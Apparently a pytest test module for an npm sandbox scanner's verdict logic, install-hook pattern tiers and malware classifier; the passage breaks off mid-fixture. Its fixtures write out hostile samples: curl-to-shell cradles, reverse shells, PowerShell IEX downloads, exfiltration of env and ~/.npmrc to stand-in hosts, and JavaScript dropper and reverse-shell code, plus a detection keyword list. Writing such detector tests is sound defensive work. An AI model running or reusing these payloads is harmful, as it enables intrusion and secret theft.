"""Tests for ``sandbox_check`` — the sandbox deep-install phase logic (F29).

F27 extracted the snapshot/diff half of the interactive ``sandbox <pkg>`` check
into :mod:`sandbox_snapshot` and pinned it. The phases that *consume* it stayed
inline in ``interactive_shell()``, a ~450-line block that needs a TTY to reach,
so the part that actually decides whether the user is told "APPEARS SAFE TO
DOWNLOAD" had no test at all. F29 moved that logic into :mod:`sandbox_check`;
this module pins it.

The central property, asserted from several directions, is the one the follow-up
called out: **a check that did not run is never a pass.** Every blind phase — an
unreadable snapshot path, an unreadable installed file, a crashed CVE scanner, a
failed install, metadata that could not be fetched, a missing package directory —
must render ``INCONCLUSIVE`` and must never render the "APPEARS SAFE" language.

:func:`test_malware_pattern_table_is_defined_once` is the anti-drift guard: the
pattern tables must not be copied back into the CLI, or the tested copy and the
shipped copy could diverge without any test noticing.
"""

import re
import time
from pathlib import Path

import pytest

import sandbox_check
from sandbox_check import (
    ALWAYS_DANGEROUS_DESCRIPTIONS,
    CAPABILITY_DESCRIPTIONS,
    CONTEXT_DESCRIPTIONS,
    ENCODED_RUN_LENGTH,
    EXPECTED_INSTALL_DIRS,
    HOOK_BODY_SCAN_LIMIT,
    INSTALL_SCRIPT_DANGER_PATTERNS,
    INSTALL_SCRIPT_HOOKS,
    INSTALL_SCRIPT_PATTERN_TABLE,
    INSTALL_SCRIPT_WARNING_PATTERNS,
    MALWARE_PATTERN_TABLE,
    MALWARE_PATTERNS,
    NETWORK_EXEC_WINDOW,
    NEXT_STEP_TYPES,
    HookSeverity,
    SandboxFindings,
    Verdict,
    analyze_install_scripts,
    build_verdict_summary,
    classify_cve_findings,
    classify_malware_hits,
    corroborated_capabilities,
    count_paths_under,
    decide_verdict,
    filter_suspicious_new_files,
    installed_package_dirname,
    is_expected_install_path,
    is_dangerous_hit,
    normalize_package_spec,
    scan_text_for_malware_patterns,
    typosquat_matches,
)

REPO_ROOT = Path(__file__).resolve().parents[1]
SRC_DIR = REPO_ROOT / "src"


class _FakeSeverity:
    """Stand-in for the scanners' Severity enum (has a ``.value``)."""

    def __init__(self, value: str) -> None:
        self.value = value


class _FakeFinding:
    def __init__(self, cve_id, title, severity):
        self.cve_id = cve_id
        self.title = title
        self.severity = severity


# ---------------------------------------------------------------------------
# The verdict table — the reason this module exists
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "has_dangers,incomplete,expected",
    [
        (False, False, Verdict.SAFE),
        (False, True, Verdict.INCONCLUSIVE),
        (True, False, Verdict.DANGER),
        (True, True, Verdict.DANGER),
    ],
)
def test_verdict_table(has_dangers, incomplete, expected):
    """Every cell of the 2x2 verdict table is pinned."""
    assert decide_verdict(has_dangers, incomplete) is expected


def test_blind_phase_downgrades_a_finding_free_run():
    """The headline property: no dangers + a blind phase is NOT a pass."""
    findings = SandboxFindings()
    findings.add_info("No install scripts detected")
    assert findings.verdict is Verdict.SAFE

    findings.mark_blind("Code analysis", "3 installed file(s) unreadable")

    assert findings.analysis_incomplete is True
    assert findings.verdict is Verdict.INCONCLUSIVE
    assert not findings.dangers


def test_inconclusive_verdict_never_renders_appears_safe():
    """The rendered panel must not tell the user a blind run looks safe."""
    summary = build_verdict_summary(Verdict.INCONCLUSIVE, "some-pkg")

    assert "APPEARS SAFE" not in summary.body
    assert "INCONCLUSIVE" in summary.body
    assert "NOT a clean bill of health" in summary.body
    assert summary.border_style == "bright_yellow"


def test_safe_verdict_renders_the_pass_language():
    summary = build_verdict_summary(Verdict.SAFE, "lodash")

    assert "APPEARS SAFE TO DOWNLOAD" in summary.body
    assert "npm install lodash" in summary.body
    assert summary.border_style == "bright_green"


def test_danger_verdict_reports_the_real_danger_count():
    summary = build_verdict_summary(Verdict.DANGER, "evil-pkg", danger_count=7)

    assert "DO NOT INSTALL" in summary.body
    assert "7" in summary.body
    assert "APPEARS SAFE" not in summary.body
    assert summary.border_style == "bright_red"


def test_each_verdict_has_a_distinct_next_step_type():
    """A blind run must not be labelled 'sandbox_safe' downstream either."""
    values = [NEXT_STEP_TYPES[v] for v in Verdict]

    assert len(set(values)) == len(values)
    assert NEXT_STEP_TYPES[Verdict.INCONCLUSIVE] != NEXT_STEP_TYPES[Verdict.SAFE]


def test_summary_next_step_type_matches_the_verdict():
    for verdict in Verdict:
        summary = build_verdict_summary(verdict, "pkg", 1)
        assert summary.verdict is verdict
        assert summary.next_step_type == NEXT_STEP_TYPES[verdict]


def test_verdict_panel_escapes_console_markup_in_the_package_name():
    """A bracket in the prompt input must not be parsed as a style tag."""
    summary = build_verdict_summary(Verdict.SAFE, "[bright_red]spoof[/bright_red]")

    assert r"\[bright_red]spoof" in summary.body
    # No UNESCAPED tag survives (a lone `[` would be parsed by Rich).
    assert re.search(r"(?<!\\)\[bright_red\]spoof", summary.body) is None


def test_danger_outranks_an_incomplete_analysis():
    findings = SandboxFindings()
    findings.mark_blind("CVE check", "1 scanner failed")
    findings.add_danger("🚨 postinstall script: Network backdoor (/dev/tcp)")

    assert findings.verdict is Verdict.DANGER


def test_mark_blind_surfaces_the_reason_as_a_warning():
    """A downgraded verdict with no stated cause is not actionable."""
    findings = SandboxFindings()
    findings.mark_blind("Install", "npm install failed")

    assert findings.blind_phases == [("Install", "npm install failed")]
    assert any("Install incomplete: npm install failed" in w for w in findings.warnings)


# ---------------------------------------------------------------------------
# Package spec normalization
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "raw,expected",
    [
        ("lodash", "lodash"),
        ("  lodash  ", "lodash"),
        ("'lodash'", "lodash"),
        ("@scope/pkg", "@scope/pkg"),
        ("lodash@4.17.21", "lodash@4.17.21"),
        ("https://npmjs.com/package/lodash", "lodash"),
        ("https://www.npmjs.com/package/lodash", "lodash"),
        ("https://www.npmjs.com/package/@scope/pkg", "@scope/pkg"),
        ("http://registry.npmjs.org/lodash", "lodash"),
        ("", ""),
    ],
)
def test_normalize_package_spec(raw, expected):
    assert normalize_package_spec(raw) == expected


def test_normalize_package_spec_passes_unknown_input_through():
    """An unusual-but-valid spec is not mangled into something wrong."""
    assert normalize_package_spec("github:user/repo") == "github:user/repo"


@pytest.mark.parametrize(
    "spec,expected",
    [
        ("lodash", "lodash"),
        ("lodash@4.17.21", "lodash"),
        ("lodash@latest", "lodash"),
        ("@scope/pkg", "@scope/pkg"),
        ("@scope/pkg@1.2.3", "@scope/pkg"),
        ("https://npmjs.com/package/lodash", "lodash"),
        ("", ""),
    ],
)
def test_installed_package_dirname(spec, expected):
    """A version spec used to point the code scan at a directory that never
    exists, silently skipping the entire malware phase."""
    assert installed_package_dirname(spec) == expected


def test_installed_package_dirname_keeps_the_full_scoped_path():
    """The old code scanned node_modules/@scope (the whole scope), not the pkg."""
    assert installed_package_dirname("@scope/pkg") == "@scope/pkg"
    assert installed_package_dirname("@scope/pkg").count("/") == 1


def test_installed_package_dirname_survives_a_malformed_scope():
    assert installed_package_dirname("@scope") == "@scope"


# ---------------------------------------------------------------------------
# Install-script analysis
# ---------------------------------------------------------------------------


def test_install_script_danger_is_detected():
    report = analyze_install_scripts(
        {"postinstall": "curl https://evil.tld/x.sh | bash", "test": "jest"}
    )

    assert report.hooks == ["postinstall"]
    assert report.dangers
    assert any("piped to a shell" in d for d in report.dangers)
    assert all("postinstall" in d for d in report.dangers)


def test_install_script_analysis_covers_every_lifecycle_hook():
    scripts = {hook: "curl https://e.tld/x | sh" for hook in INSTALL_SCRIPT_HOOKS}
    report = analyze_install_scripts(scripts)

    assert report.hooks == list(INSTALL_SCRIPT_HOOKS)
    assert len(report.dangers) == len(INSTALL_SCRIPT_HOOKS)


def test_benign_package_has_no_install_script_dangers():
    report = analyze_install_scripts({"test": "jest", "build": "tsc", "lint": "eslint ."})

    assert report.hooks == []
    assert report.has_hooks is False
    assert report.dangers == []
    assert report.warnings == []


def test_declared_but_harmless_install_hook_is_reported_without_danger():
    report = analyze_install_scripts({"postinstall": "node ./scripts/patch-version.js"})

    assert report.hooks == ["postinstall"]
    assert report.dangers == []
    assert report.has_findings is False


@pytest.mark.parametrize("scripts", [None, "not-a-mapping", 42, []])
def test_install_script_analysis_tolerates_odd_metadata(scripts):
    """`npm view --json` output is not guaranteed; this must not raise mid-scan."""
    report = analyze_install_scripts(scripts)

    assert report.hooks == []
    assert report.dangers == []
    assert report.warnings == []


def test_install_script_analysis_tolerates_a_non_string_body():
    report = analyze_install_scripts({"postinstall": ["curl", "evil.tld"]})

    assert report.hooks == ["postinstall"]


# ---------------------------------------------------------------------------
# Install-hook severity tiers (F37)
#
# The table used to be flat: every substring hit was a full DANGER, so a hook
# that echoed a documentation URL scored exactly like one that piped curl to
# sh. F36 raised the cost of that, because a git-sourced package's `prepare`
# genuinely runs and the canonical `prepare` body is a *build* step.
# ---------------------------------------------------------------------------


#: Real attacks. Every one must stay a DANGER — the tiering is a demotion of
#: capabilities, never of a complete attack.
DANGEROUS_HOOK_BODIES = [
    ("curl http://evil.tld/x.sh | /bin/sh", "piped to a shell"),
    ("curl -sL https://evil.tld/a.sh | bash", "piped to a shell"),
    ("wget -qO- https://e.tld/x | sh", "piped to a shell"),
    ("wget https://e.tld/x -O- | sudo /bin/bash", "piped to a shell"),
    (
        "powershell -c \"IEX (New-Object Net.WebClient).DownloadString('http://e.tld/a')\"",
        "piped to a shell",
    ),
    (
        'powershell -Command "Invoke-WebRequest https://e.tld/a.ps1 -OutFile a; iex a"',
        "piped to a shell",
    ),
    ("curl -s https://e.tld/p -o /tmp/p; chmod +x /tmp/p; /tmp/p", "downloaded file executed"),
    ("wget https://e.tld/p -O p && ./p", "downloaded file executed"),
    ("curl -o s.sh https://e.tld/s && sh s.sh", "downloaded file executed"),
    ("curl https://e.tld/x > f.sh && bash f.sh", "downloaded file executed"),
    ("echo ZXZpbA== | base64 -d | bash", "encoded payload executed"),
    ("base64 --decode payload.b64 | sh", "encoded payload executed"),
    (
        "node -e \"eval(Buffer.from(process.argv[1],'base64').toString())\"",
        "encoded payload executed",
    ),
    ("powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA", "encoded payload executed"),
    ("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", "reverse shell"),
    ("nc -e /bin/sh 10.0.0.1 4444", "reverse shell"),
    ("ncat --exec /bin/bash 10.0.0.1 4444", "reverse shell"),
    ("socat TCP:10.0.0.1:4444 EXEC:/bin/sh", "reverse shell"),
    ('curl -X POST -d "$(env | base64)" https://collector.tld/x', "local data sent"),
    ("curl --data @- https://c.tld/x <<< $(cat ~/.npmrc)", "local data sent"),
]

#: Real published install hooks, or shapes indistinguishable from them. None
#: may reach DANGER: each is a package building itself.
BENIGN_HOOK_BODIES = [
    "node-gyp rebuild",
    "prebuild-install || node-gyp rebuild",
    "node ./scripts/install.js --fallback-to-build",
    "node install.js || nodejs install.js",
    "patch-package && node scripts/copy.js",
    "make && make install",
    "opencollective-postinstall || exit 0",
    "npm run sync && node ./post.js",
    # F34's own measured example, and F36's inversion case: deleting your own
    # build output before rebuilding it is not an attack.
    "rm -rf dist && npm run build",
    # The single true positive F34 produced over 44,980 packages, reported as
    # "External URL (https://)" — the weakest row in the flat table.
    "git clone --depth 1 https://github.com/facebookresearch/faiss.git && cd faiss "
    "&& cmake -B build .",
    'echo "Docs: https://github.com/x/y"',
    "node -e \"console.log(process.env.npm_config_x)\"",
    "cross-env NODE_ENV=production webpack --config webpack.config.js",
    "husky install",
    "tsc -p tsconfig.build.json",
    # `phenomenon`'s real `prepare`. The flat table called it "Command
    # execution" because `exec` is a substring of `npm_execpath`.
    "$npm_execpath run test",
    # `faiss-node`'s real `install`, the single true positive F34 produced over
    # 44,980 packages — reported as "External URL (https://)".
    "prebuild-install --runtime napi --verbose || (git clone -b v1.7.4 --depth 1 "
    "https://github.com/facebookresearch/faiss.git deps/faiss && npm i cmake-js "
    "&& npm run build)",
    "rm -rf lib && tsc",
    "rm -rf dist && npm run compile && node ./scripts/fixup.cjs",
    # A hook may legitimately download and then run something *else*. Requiring
    # any `./x` after a downloader to be an attack reads all four of these as
    # one; the danger row back-references the downloaded filename instead.
    "curl -o deps.tgz https://cdn.example.com/deps.tgz && ./scripts/unpack.sh",
    "curl -fsSL https://get.example.com/v.json -o version.json && node build.js",
    "wget -q https://x/y.tar.gz -O deps.tgz && tar xzf deps.tgz && make",
    "curl -L https://x/a.zip --output a.zip && unzip a.zip && ./configure && make",
]


@pytest.mark.parametrize("body,expected", DANGEROUS_HOOK_BODIES)
def test_a_complete_attack_in_a_hook_is_still_a_danger(body, expected):
    report = analyze_install_scripts({"postinstall": body})

    assert report.dangers, f"demoted a real attack: {body!r}"
    assert any(expected in danger for danger in report.dangers)


@pytest.mark.parametrize("body", BENIGN_HOOK_BODIES)
def test_a_build_hook_never_reaches_danger(body):
    """The flat table called several of these DO NOT INSTALL."""
    report = analyze_install_scripts({"prepare": body})

    assert report.dangers == [], f"false danger on a build hook: {body!r}"


@pytest.mark.parametrize("body", BENIGN_HOOK_BODIES)
def test_a_benign_hook_still_reaches_the_verdict_as_at_most_a_warning(body):
    """Demoting the tier must not change the verdict path for a clean package."""
    findings = SandboxFindings()
    report = analyze_install_scripts({"prepare": body})
    findings.extend(dangers=report.dangers, warnings=report.warnings)

    assert findings.verdict is Verdict.SAFE


@pytest.mark.parametrize(
    "body",
    [
        "rm -rf dist && npm run build",
        'echo "Docs: https://github.com/x/y"',
        "node -e \"require('child_process').execSync('echo hi')\"",
    ],
)
def test_a_demoted_pattern_is_still_reported_as_a_warning(body):
    """Tiering re-ranks; it never silences. The line still ships, one tier down."""
    report = analyze_install_scripts({"prepare": body})

    assert report.dangers == []
    assert report.warnings
    assert report.has_findings is True
    assert all(line.startswith("⚠️") for line in report.warnings)


def test_every_flat_table_substring_still_produces_a_line():
    """No coverage was dropped on the way to two tiers.

    The flat table's twenty substrings are the free product's install-hook
    detection surface; F37 re-ranks them and must not remove one. Each is
    embedded in a hook body here and has to come back at *some* severity.
    """
    substrings = [
        "curl",
        "wget",
        "eval",
        "exec",
        "child_process",
        "rm -rf",
        "base64",
        "/dev/tcp",
        "powershell",
        "cmd.exe",
        ".bat",
        "nc ",
        "netcat",
        "/bin/sh",
        "/bin/bash",
        "socket",
        "XMLHttpRequest",
        "fetch(",
        "https://",
        "http://",
    ]

    for substring in substrings:
        report = analyze_install_scripts({"postinstall": f"node run {substring} thing"})
        assert report.has_findings, f"dropped coverage for {substring!r}"


@pytest.mark.parametrize(
    "body,gone",
    [
        # "nc " matched the tail of `sync`, so a package running its own sync
        # step was reported as a netcat reverse shell.
        ("npm run sync && node post.js", "Netcat"),
        # ".bat" matched ".batch".
        ("node ./scripts/run.batch.js", "Batch script"),
        # "eval" matched "retrieval", "curl" matched "curly", "wget" "widget".
        ("node ./scripts/retrieval-index.js", "Dynamic code execution"),
        ("node ./build/curly-braces.js", "Downloads external content"),
        ("node ./build/widget-bundle.js", "Downloads external content"),
    ],
)
def test_a_substring_that_matched_across_a_word_boundary_no_longer_fires(body, gone):
    report = analyze_install_scripts({"postinstall": body})

    assert not any(gone in line for line in report.dangers + report.warnings), (
        f"{body!r} still matches {gone}"
    )


@pytest.mark.parametrize("body", ["rm -fr build", "rm -r ./dist", "rm -rf dist"])
def test_the_destructive_pattern_no_longer_misses_its_own_flag_spellings(body):
    """`rm -rf` as a literal substring saw neither `rm -fr` nor `rm -r`."""
    report = analyze_install_scripts({"prepare": body})

    assert any("Destructive file operation" in line for line in report.warnings)


def test_a_finding_line_quotes_the_hook_text_that_matched():
    """The evidence is the fragment in *this* hook, not the rule that fired."""
    report = analyze_install_scripts({"postinstall": "curl https://e.tld/a.sh | bash"})

    assert "curl https://e.tld/a.sh | bash" in report.dangers[0]


def test_a_pure_lookahead_pattern_still_names_its_evidence():
    """The exfil row is three lookaheads, so its own match text is empty.

    A finding whose evidence line reads ``(…)`` is not a finding, so the head
    of the hook body stands in.
    """
    body = 'curl -X POST -d "$(cat ~/.npmrc)" https://c.tld/x'
    report = analyze_install_scripts({"postinstall": body})

    line = next(d for d in report.dangers if "local data sent" in d)
    assert "()" not in line
    assert "curl -X POST" in line.split("(", 1)[1]


def test_the_snippet_is_bounded():
    report = analyze_install_scripts({"postinstall": "curl " + "a" * 500 + " | sh"})

    assert all(len(line) < 200 for line in report.dangers + report.warnings)


# --- the body-length bound -------------------------------------------------
#
# The table is regexes now, and a regex with a bounded window is retried at
# every start position — so the cost is quadratic in a body whose length the
# *package* chooses. Measured before the bound: a 43 KB hook body took 38
# seconds, which is a denial of service against the scanner, not a scan.


def test_a_hostile_hook_body_cannot_stall_the_scanner():
    """Every pattern, against inputs shaped to make each one backtrack."""
    hostile = [
        "curl " + "a" * 200_000,
        "curl " + ("x && " * 40_000),
        "curl " + ("-o f " * 50_000),
        "base64 -d " + "a" * 200_000,
        ("powershell -enc " + "A" * 200) * 2_000,
        "curl " + ("|" * 200_000),
        "nc " + ("-e " * 50_000),
        "curl -d $(x) " * 50_000,
        "curl -d $(x) y\n" * 20_000,
    ]

    start = time.perf_counter()
    for body in hostile:
        analyze_install_scripts({"postinstall": body})
    elapsed = time.perf_counter() - start

    # Generous: the measured total is a few milliseconds. The unbounded table
    # took over a minute for the same list at a tenth of these sizes.
    assert elapsed < 5.0, f"install-hook table stalled: {elapsed:.1f}s"


def test_an_oversized_hook_body_is_read_in_part_and_says_so():
    body = "echo hi && " + "a" * (HOOK_BODY_SCAN_LIMIT * 2)
    report = analyze_install_scripts({"postinstall": body})

    assert report.truncated_hooks == ["postinstall"]
    assert any(str(HOOK_BODY_SCAN_LIMIT) in w for w in report.warnings)
    assert any("only the first" in w for w in report.warnings)
    # The body itself is still carried in full for display.
    assert report.bodies["postinstall"] == body


def test_an_oversized_hook_body_makes_the_phase_blind_not_safe():
    """"Nothing in the first 4,000 characters" is not a pass (the F29 rule)."""
    findings = SandboxFindings()
    report = analyze_install_scripts({"postinstall": "a" * (HOOK_BODY_SCAN_LIMIT + 1)})
    findings.extend(dangers=report.dangers, warnings=report.warnings)
    if report.truncated_hooks:
        findings.mark_blind("Install-script analysis", "body was not read in full")

    assert findings.verdict is Verdict.INCONCLUSIVE
    assert "APPEARS SAFE" not in build_verdict_summary(findings.verdict, "pkg").body


def test_the_scan_limit_clears_every_real_install_hook():
    """532 characters is the longest hook body in the measured corpus."""
    assert HOOK_BODY_SCAN_LIMIT >= 532 * 5


@pytest.mark.parametrize("body", [b for b, _ in DANGEROUS_HOOK_BODIES])
def test_an_attack_hidden_behind_padding_is_still_caught(body):
    """Truncation must not become a way to hide the payload behind filler."""
    padded = "echo start && " + body

    assert analyze_install_scripts({"postinstall": padded}).dangers


def test_the_two_tier_views_partition_the_table():
    assert set(INSTALL_SCRIPT_DANGER_PATTERNS).isdisjoint(INSTALL_SCRIPT_WARNING_PATTERNS)
    assert len(INSTALL_SCRIPT_DANGER_PATTERNS) + len(INSTALL_SCRIPT_WARNING_PATTERNS) == len(
        INSTALL_SCRIPT_PATTERN_TABLE
    )
    assert INSTALL_SCRIPT_DANGER_PATTERNS, "the danger tier must not be empty"


def test_every_install_hook_pattern_compiles_and_is_described_once():
    seen = set()
    for entry in INSTALL_SCRIPT_PATTERN_TABLE:
        re.compile(entry.regex)
        assert entry.severity in (HookSeverity.DANGER, HookSeverity.WARNING)
        key = (entry.regex, entry.description)
        assert key not in seen, f"duplicate row: {key}"
        seen.add(key)


def test_the_danger_tier_leads_the_table():
    """A report shows the strongest thing it found first."""
    severities = [entry.severity for entry in INSTALL_SCRIPT_PATTERN_TABLE]
    first_warning = severities.index(HookSeverity.WARNING)

    assert HookSeverity.DANGER not in severities[first_warning:]


# ---------------------------------------------------------------------------
# Expected-location filter
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "path",
    [
        "node_modules/lodash/index.js",
        ".npm-cache/_cacache/index-v5/aa/bb",
        ".npm/_logs/2026-07-27-debug.log",
        "package.json",
        "package-lock.json",
        ".package-lock.json",
    ],
)
def test_npm_artifacts_are_expected(path):
    assert is_expected_install_path(path) is True


@pytest.mark.parametrize(
    "path",
    [
        ".ssh/id_rsa",
        ".bashrc",
        "payload.js",
        "sub/dir/backdoor.sh",
    ],
)
def test_dropped_payloads_are_not_expected(path):
    assert is_expected_install_path(path) is False


def test_lookalike_root_file_is_no_longer_treated_as_expected():
    """The inline filter asked `'package.json' in path`, so a payload named
    `evil-package.json` matched and was silently dropped."""
    assert is_expected_install_path("evil-package.json") is False
    assert is_expected_install_path("stolen-package-lock.json") is False


def test_payload_hidden_behind_a_node_modules_segment_is_not_expected():
    """`'node_modules/' in path` also matched `.ssh/node_modules/...`."""
    assert is_expected_install_path(".ssh/node_modules/authorized_keys") is False
    assert is_expected_install_path("home/.config/node_modules/x") is False


def test_filter_suspicious_new_files_keeps_only_the_unexpected():
    new_files = [
        "node_modules/lodash/index.js",
        "node_modules/.package-lock.json",
        ".npm-cache/_cacache/tmp/x",
        "package-lock.json",
        ".ssh/authorized_keys",
        "evil-package.json",
    ]

    assert filter_suspicious_new_files(new_files) == [
        ".ssh/authorized_keys",
        "evil-package.json",
    ]


def test_benign_install_produces_no_suspicious_files():
    new_files = [
        "node_modules/lodash/package.json",
        "node_modules/lodash/index.js",
        ".npm-cache/_cacache/content-v2/sha512/aa/bb/cc",
        "package-lock.json",
    ]

    assert filter_suspicious_new_files(new_files) == []


def test_dot_prefixed_npm_dirs_are_matched_not_stripped():
    """Regression: `lstrip("./")` strips a character SET, so ".npm-cache/x"
    became "npm-cache/x" and every cached file read as a dropped payload."""
    assert is_expected_install_path(".npm-cache/_cacache/tmp/x") is True
    assert is_expected_install_path("./.npm-cache/_cacache/tmp/x") is True
    assert is_expected_install_path("./package.json") is True
    # ...while a genuinely unexpected dot-file is still reported.
    assert is_expected_install_path(".npmrc-stolen") is False


def test_expected_path_matching_is_windows_separator_safe():
    assert is_expected_install_path("node_modules\\lodash\\index.js") is True
    assert is_expected_install_path(".ssh\\id_rsa") is False


def test_count_paths_under_is_segment_anchored():
    paths = [
        "node_modules/a.js",
        "node_modules/b/c.js",
        ".npm-cache/x",
        "my-node_modules/evil.js",
    ]

    assert count_paths_under(paths, "node_modules") == 2
    assert count_paths_under(paths, ".npm-cache") == 1


def test_every_expected_dir_is_a_bare_segment():
    """A trailing slash would break the segment comparison silently."""
    for name in EXPECTED_INSTALL_DIRS:
        assert "/" not in name


# ---------------------------------------------------------------------------
# Malware-pattern pass
# ---------------------------------------------------------------------------


def test_malware_patterns_detect_obvious_payload_code():
    hits = scan_text_for_malware_patterns(
        "const cp = require('child_process');\n"
        "cp.exec(Buffer.from(payload, 'base64').toString());"
    )

    assert any("child_process" in h for h in hits)
    assert any("exec()" in h for h in hits)
    assert any("base64" in h for h in hits)


def test_malware_patterns_are_quiet_on_plain_code():
    hits = scan_text_for_malware_patterns(
        "module.exports = function add(a, b) { return a + b; };"
    )

    assert hits == []


def test_scan_text_handles_empty_content():
    assert scan_text_for_malware_patterns("") == []


def test_malware_hits_split_into_dangers_and_warnings():
    """A capability co-located with an attacker context signal is a danger."""
    hits = [
        ("a.js", "child_process - command execution"),
        ("b.js", "child_process - command execution"),
        ("a.js", "hex-encoded string blob (possible obfuscation)"),
        ("a.js", "HTTP client"),
    ]

    report = classify_malware_hits(hits)

    assert report.counts["child_process - command execution"] == 2
    assert report.total_hits == 4
    assert any("child_process" in d and "2 occurrences" in d for d in report.dangers)
    # An import is reported, but only ever as a warning (F35).
    assert any("HTTP client" in w for w in report.warnings)
    assert not any("HTTP client" in d for d in report.dangers)


def test_library_shaped_patterns_are_warnings_not_dangers():
    """`fs`/`http`/`process.env` are also ordinary library code — flagging them
    as dangers would make every real package a DO-NOT-INSTALL."""
    report = classify_malware_hits(
        [
            ("a.js", "filesystem access"),
            ("a.js", "environment variable access"),
            ("a.js", "HTTPS client"),
        ]
    )

    assert report.dangers == []
    assert len(report.warnings) == 3


def test_malware_classification_ordering_is_deterministic():
    hits = [("a.js", "eval() - dynamic code execution"), ("b.js", "HTTP client")]

    first = classify_malware_hits(hits)
    second = classify_malware_hits(hits)

    assert first.dangers == second.dangers
    assert list(first.counts) == list(second.counts)


def test_no_hits_yields_an_empty_classification():
    report = classify_malware_hits([])

    assert report.dangers == []
    assert report.warnings == []
    assert report.total_hits == 0


# ---------------------------------------------------------------------------
# Malware-pattern calibration (F31)
#
# The keyword classifier told users not to install lodash: `\.exec\s*\(` matched
# JavaScript's `RegExp.prototype.exec`, `Function\s*\(` matched every anonymous
# `function(` because the table compiled with IGNORECASE, and the word
# "credentials" alone counted as credential theft (which condemned axios). The
# tests below pin the calibration from both directions: mainstream-package code
# must produce ZERO dangers, and every real attack shape must still be a danger.
# ---------------------------------------------------------------------------


#: Verbatim shapes from real mainstream packages, each of which the pre-F31
#: table flagged. Sources named so a future edit can re-check them.
BENIGN_PACKAGE_CODE = {
    # lodash: RegExp.prototype.exec — the hit that made `npm install lodash` a
    # DO-NOT-INSTALL verdict.
    "lodash regexp exec": (
        "function trimmedEndIndex(string) {\n"
        "  var index = string.length;\n"
        "  while (index-- && reWhitespace.test(string.charAt(index))) {}\n"
        "  return index;\n"
        "}\n"
        "var match = reTrimStart.exec(string);\n"
    ),
    # lodash/express/react: anonymous functions, 193 hits on lodash alone.
    "anonymous function expressions": (
        "module.exports = function (a, b) { return a + b; };\n"
        "var f = function(x) { return x; };\n"
        "arr.map(function (item) { return item * 2; });\n"
    ),
    # axios: `withCredentials` — the word alone was scored as credential theft.
    "axios withCredentials": (
        "if (config.withCredentials !== undefined) {\n"
        "  request.withCredentials = !!config.withCredentials;\n"
        "}\n"
        "// Set the password for basic auth credentials\n"
    ),
    # lodash: isolated escapes in a character table, not an encoded blob.
    "isolated escape sequences": (
        "var reEscapedHtml = /&(?:amp|lt|gt|quot|#39);/g;\n"
        "var rsAstralRange = '\\\\ud800-\\\\udfff',\n"
        "    rsComboRange = '\\\\u0300-\\\\u036f\\\\ufe20-\\\\ufe2f';\n"
        "var deburred = '\\xc0\\xc1';\n"
    ),
    # A word that merely ends in "eval".
    "retrieval is not eval": "const value = await retrieval(key);\n",
    # typescript: decoding an IPC response is ordinary data handling.
    "typescript base64 ipc decode": (
        "const buffer = Buffer.from(response.data, 'base64');\n"
        "return new Uint8Array(buffer.buffer, buffer.byteOffset);\n"
    ),
    # react/debug/dotenv: reading configuration.
    "process.env config read": (
        "if (process.env.NODE_ENV !== 'production') { warn(); }\n"
    ),
    # A UI library describing keyboard handling.
    "keystroke prose in a ui library": (
        "// Fired once per keystroke while the menu is open.\n"
        "function onKeyDown(event) { return event.key; }\n"
    ),
    # --- F35: the shapes `require('http')`-as-context condemned. Each is taken
    # from the package named, in the 736-package corpus that falsified the
    # signal. All four also carry a capability in the same file, which is what
    # made them DO NOT INSTALL.
    #
    # vite: the import pair is inside a JSDoc example, not even code.
    "vite jsdoc http import next to a spawn": (
        "const cp = require('child_process');\n"
        "/**\n"
        " *      var connect = require('connect')\n"
        " *        , http = require('http')\n"
        " *        , https = require('https');\n"
        " *      http.createServer(app).listen(80);\n"
        " */\n"
        "cp.spawnSync('node', [entry]);\n"
    ),
    # @agent-tars/{cli,core,server}: webpack's bundled map of node builtins.
    "webpack bundled builtin module map": (
        "    http: function(module) {\n"
        '        "use strict";\n'
        '        module.exports = require("http");\n'
        "    },\n"
        "    https: function(module) {\n"
        '        "use strict";\n'
        '        module.exports = require("https");\n'
        "    },\n"
        '    child_process: function(module) {\n'
        '        module.exports = require("child_process");\n'
        "    },\n"
        "    __webpack_require__.f = function(chunkId) { return new Function(src); };\n"
    ),
    # esbuild/install.js: a real import, used to download the package's own
    # platform binary from the npm registry and then run it.
    "esbuild binary installer imports": (
        'var zlib = require("zlib");\n'
        'var https = require("https");\n'
        'var child_process = require("child_process");\n'
        "function validateBinaryVersion(...command) {\n"
        "  const stdout = child_process.execFileSync(command.shift(), command);\n"
        "  return stdout;\n"
        "}\n"
    ),
    # The shape the command sink is anchored against: parsing a fetched string
    # with a regular expression, in a file that also shells out.
    "regexp exec on a fetched response body": (
        "const cp = require('child_process');\n"
        "const res = await fetch(registryUrl);\n"
        "const body = await res.text();\n"
        "const match = RE_VERSION.exec(body);\n"
        "return match && match[1];\n"
    ),
    # A dev server does both things; it does not wire them to each other.
    "dev server serves and spawns": (
        "const http = require('http');\n"
        "const { spawn } = require('child_process');\n"
        "const server = http.createServer(app);\n"
        "server.listen(port);\n"
        "const child = spawn('node', [entry]);\n"
    ),
    # `fetch` is also an ordinary method name on caches, stores and ORMs.
    "cache fetch method beside a command": (
        "const cp = require('child_process');\n"
        "const entry = cache.fetch(key);\n"
        "if (!entry) { cp.execSync('git rev-parse HEAD'); }\n"
    ),
}

#: Real npm-malware shapes. Each must survive calibration as a DANGER.
MALICIOUS_PACKAGE_CODE = {
    "base64 dropper cradle": (
        "const p = 'aHR0cDovL2V2aWwudGxk';\n"
        "eval(Buffer.from(p, 'base64').toString());\n"
    ),
    "atob cradle": "eval(atob(payload));\n",
    "reverse shell": (
        "const net = require('net'), cp = require('child_process');\n"
        "const s = net.connect(4444, '10.0.0.9');\n"
        "const sh = cp.spawn('/bin/sh', []);\n"
        "s.pipe(sh.stdin); sh.stdout.pipe(s);\n"
    ),
    "windows shell dropper": (
        "const { execSync } = require('child_process');\n"
        "execSync('cmd.exe /c curl http://evil.tld/a.exe -o a.exe && a.exe');\n"
    ),
    "download and run": (
        "const https = require('https');\n"
        "const cp = require('child_process');\n"
        "https.get('https://evil.tld/p.sh', r => r.pipe(f));\n"
        "cp.exec('sh /tmp/p.sh');\n"
    ),
    "env exfil over https": (
        "const https = require('https');\n"
        "const cp = require('child_process');\n"
        "cp.exec('env', (e, out) =>\n"
        "  https.request('https://evil.tld/c', { method: 'POST' }).end(out));\n"
